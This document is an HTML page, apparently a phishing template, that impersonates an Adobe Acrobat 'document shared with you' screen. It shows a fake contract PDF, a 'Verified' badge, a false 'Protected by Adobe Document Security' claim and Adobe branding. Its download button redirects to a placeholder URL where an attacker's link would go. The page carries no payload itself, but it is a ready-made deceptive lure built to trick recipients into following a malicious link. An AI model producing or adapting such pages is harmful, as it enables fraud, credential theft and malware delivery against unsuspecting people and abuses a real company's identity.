<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Acrobat - Shared Document</title>
    <link rel="icon" href="https://www.adobe.com/favicon.ico">
    <style>
        @page { size: A4; margin: 0; }

        *, *::before, *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Header */
        .header {
            background: #fff;
            height: 54px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 28px;
            border-bottom: 1px solid #e2e2e2;
        }

        .brand {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .brand svg {
            width: 24px;
            height: 20px;
        }

        .brand span {
            font-size: 15px;
            font-weight: 700;
            color: #222;
        }

        .header a {
            font-size: 13px;
            color: #1473e6;
            text-decoration: none;
            font-weight: 600;
        }

        .header a:hover {
            text-decoration: underline;
        }

        /* Main */
        .main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        .card {
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 1px 4px rgba(0,0,0,0.06), 0 6px 24px rgba(0,0,0,0.05);
            max-width: 480px;
            width: 100%;
            overflow: hidden;
        }

        /* Top accent */
        .accent-bar {
            background: linear-gradient(135deg, #1473e6, #0b5cbf);
            padding: 28px 32px;
            text-align: center;
            color: #fff;
        }

        .accent-bar .icon-wrap {
            width: 44px;
            height: 44px;
            background: rgba(255,255,255,0.15);
            border-radius: 12px;
            margin: 0 auto 12px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .accent-bar .icon-wrap svg {
            width: 24px;
            height: 24px;
        }

        .accent-bar h1 {
            font-size: 19px;
            font-weight: 700;
            margin-bottom: 4px;
        }

        .accent-bar p {
            font-size: 13px;
            opacity: 0.8;
        }

        /* Body */
        .body {
            padding: 24px 32px 32px;
        }

        .file-row {
            display: flex;
            align-items: center;
            gap: 14px;
            padding: 14px;
            background: #fafafa;
            border: 1px solid #eee;
            border-radius: 10px;
            margin-bottom: 20px;
        }

        .file-row svg {
            width: 40px;
            height: 48px;
            flex-shrink: 0;
        }

        .file-info {
            flex: 1;
            min-width: 0;
        }

        .file-info .name {
            font-size: 14px;
            font-weight: 600;
            color: #1a1a1a;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .file-info .meta {
            font-size: 11px;
            color: #999;
            margin-top: 2px;
        }

        .badge {
            background: #e8f5e9;
            color: #2e7d32;
            font-size: 10px;
            font-weight: 600;
            padding: 4px 10px;
            border-radius: 10px;
        }

        /* Stats */
        .stats {
            display: flex;
            gap: 10px;
            margin-bottom: 24px;
        }

        .stat {
            flex: 1;
            text-align: center;
            padding: 12px 8px;
            background: #fafafa;
            border-radius: 8px;
        }

        .stat .val {
            font-size: 15px;
            font-weight: 700;
            color: #222;
        }

        .stat .lbl {
            font-size: 10px;
            color: #aaa;
            text-transform: uppercase;
            letter-spacing: 0.3px;
            margin-top: 2px;
        }

        /* Button */
        .dl-btn {
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            background: #1473e6;
            color: #fff;
            border: none;
            border-radius: 20px;
            padding: 14px 24px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }

        .dl-btn:hover {
            background: #0d66d0;
        }

        .dl-btn svg {
            width: 18px;
            height: 18px;
        }

        .security-note {
            margin-top: 16px;
            font-size: 11px;
            color: #b0b0b0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }

        .security-note svg {
            width: 13px;
            height: 13px;
            fill: #4caf50;
        }

        /* Footer */
        .footer {
            text-align: center;
            padding: 16px;
            font-size: 11px;
            color: #bbb;
        }

        .footer a {
            color: #bbb;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        @media print {
            body { background: #fff; }
            .card { box-shadow: none; border: 1px solid #ddd; }
            .accent-bar, .dl-btn, .badge { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="brand">
            <svg viewBox="0 0 30 26" fill="none">
                <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
                <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
                <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
            </svg>
            <span>Adobe Acrobat</span>
        </div>
        <a href="#">Sign in</a>
    </header>

    <main class="main">
        <article class="card">
            <div class="accent-bar">
                <div class="icon-wrap">
                    <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/>
                        <polyline points="14 2 14 8 20 8"/>
                    </svg>
                </div>
                <h1>Document shared with you</h1>
                <p>Via Adobe Document Cloud</p>
            </div>

            <div class="body">
                <div class="file-row">
                    <svg viewBox="0 0 40 48" fill="none">
                        <path d="M0 4C0 1.79 1.79 0 4 0H24L40 16V44C40 46.21 38.21 48 36 48H4C1.79 48 0 46.21 0 44V4Z" fill="#FDEEEE"/>
                        <path d="M24 0L40 16H28C25.79 16 24 14.21 24 12V0Z" fill="#F5CCCC"/>
                        <text x="20" y="34" text-anchor="middle" fill="#EB1000" font-size="9" font-weight="700" font-family="sans-serif">PDF</text>
                    </svg>
                    <div class="file-info">
                        <div class="name">Contract_Agreement_2026.pdf</div>
                        <div class="meta">Shared Apr 14, 2026</div>
                    </div>
                    <span class="badge">Verified</span>
                </div>

                <div class="stats">
                    <div class="stat">
                        <div class="val">3.6 MB</div>
                        <div class="lbl">Size</div>
                    </div>
                    <div class="stat">
                        <div class="val">9</div>
                        <div class="lbl">Pages</div>
                    </div>
                    <div class="stat">
                        <div class="val">PDF 1.7</div>
                        <div class="lbl">Format</div>
                    </div>
                </div>

                <button class="dl-btn" onclick="window.location.href='REDIRECT_URL_HERE'">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
                        <polyline points="7 10 12 15 17 10"/>
                        <line x1="12" y1="15" x2="12" y2="3"/>
                    </svg>
                    Download PDF
                </button>

                <div class="security-note">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
                    Protected by Adobe Document Security
                </div>
            </div>
        </article>
    </main>

    <footer class="footer">
        &copy; 2026 Adobe. All rights reserved. &middot;
        <a href="#">Privacy</a> &middot;
        <a href="#">Terms of Use</a>
    </footer>
</body>
</html>
